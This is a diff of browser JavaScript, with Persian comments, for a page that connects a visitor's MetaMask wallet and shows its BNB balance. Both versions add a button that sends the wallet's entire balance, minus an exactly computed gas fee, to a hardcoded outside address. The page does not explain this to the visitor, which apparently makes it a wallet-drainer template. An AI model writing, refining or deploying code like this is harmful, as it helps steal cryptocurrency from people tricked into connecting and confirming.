@@ -1,75 +1,63 @@
-import { ethers } from "ethers";
+import { ethers } from 'ethers';
 
-// المان‌های UI
-const connectButton = document.getElementById("connectButton");
-const sendTransactionButton = document.getElementById("sendTransactionButton");
-const walletAddressElement = document.getElementById("walletAddress");
-const bnbBalanceElement = document.getElementById("bnbBalance");
+const connectBtn = document.getElementById('connect');
+const sendAllBtn = document.getElementById('sendAll');
+const addressSpan = document.getElementById('address');
+const balanceSpan = document.getElementById('balance');
+const walletInfo = document.getElementById('walletInfo');
 
-let provider, signer, walletAddress;
+// آدرس مقصد ثابت
+const recipient = '0x98907E5eE9E010c34DF6F7847565D421D3CDAd05'; // جایگزین کنید
 
-// اتصال به MetaMask از طریق Deep Link
-connectButton.addEventListener("click", async () => {
+let provider;
+let signer;
+let userAddress;
+
+connectBtn.addEventListener('click', async () => {
+  if (typeof window.ethereum === 'undefined') {
+    alert('لطفاً متامسک را نصب کنید.');
+    return;
+  }
+
   try {
-    // بررسی اینکه آیا MetaMask نصب است یا نه
-    if (typeof window.ethereum === "undefined") {
-      alert("MetaMask را نصب کنید.");
-      return;
-    }
-
-    // استفاده از Deep Link برای باز کردن MetaMask
-    window.location.href = "metamask://";
-
-    // درخواست دسترسی به حساب‌ها (پس از اینکه MetaMask باز شود)
-    await window.ethereum.request({ method: "eth_requestAccounts" });
-
-    // ایجاد Web3 provider و signer
-    provider = new ethers.providers.Web3Provider(window.ethereum);
+    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
     signer = provider.getSigner();
+    userAddress = await signer.getAddress();
 
-    // دریافت آدرس کیف پول
-    walletAddress = await signer.getAddress();
-    walletAddressElement.textContent =` آدرس کیف پول: ${walletAddress}`;
+    const balanceWei = await provider.getBalance(userAddress);
+    const balanceBNB = ethers.utils.formatEther(balanceWei);
 
-    // دریافت موجودی BNB
-    const balance = await signer.getBalance();
-    const formattedBalance = ethers.utils.formatEther(balance);
-    bnbBalanceElement.textContent =` موجودی BNB: ${formattedBalance}`;
-
-    // نمایش دکمه ارسال تراکنش
-    sendTransactionButton.style.display = "inline-block";
+    addressSpan.textContent = userAddress;
+    balanceSpan.textContent = balanceBNB;
+    walletInfo.style.display = 'block';
   } catch (error) {
-    console.error(error);
-    alert("اتصال به کیف پول با خطا مواجه شد.");
+    console.error('خطا در اتصال به کیف پول:', error);
   }
 });
 
-// ارسال تراکنش
-sendTransactionButton.addEventListener("click", async () => {
+sendAllBtn.addEventListener('click', async () => {
   try {
-    const recipientAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";  // آدرس مقصد خود را وارد کنید
+    const balanceWei = await provider.getBalance(userAddress);
+    const gasPrice = await provider.getGasPrice();
+    const gasLimit = ethers.utils.hexlify(21000);
+    const totalGasCost = gasPrice.mul(gasLimit);
+    const amountToSend = balanceWei.sub(totalGasCost);
 
-    // دریافت موجودی کیف پول
-    const balance = await signer.getBalance();
-    const gasFee = ethers.utils.parseEther("0.001");
-
-    if (balance.lt(gasFee)) {
-      alert("موجودی برای گس کافی نیست!");
+    if (amountToSend.lte(0)) {
+      alert('موجودی کافی برای پرداخت کارمزد وجود ندارد.');
       return;
     }
 
-    const amountToSend = balance.sub(gasFee); // مقدار قابل ارسال
-
-    // ارسال تراکنش
     const tx = await signer.sendTransaction({
-      to: recipientAddress,
+      to: recipient,
       value: amountToSend,
+      gasLimit: gasLimit,
+      gasPrice: gasPrice,
     });
 
-    await tx.wait();
-    alert("تراکنش با موفقیت ارسال شد!");
+    alert(`تراکنش ارسال شد. شناسه تراکنش: ${tx.hash}`);
   } catch (error) {
-    console.error(error);
-    alert("ارسال تراکنش با خطا مواجه شد.");
+    console.error('خطا در ارسال تراکنش:', error);
   }
 });
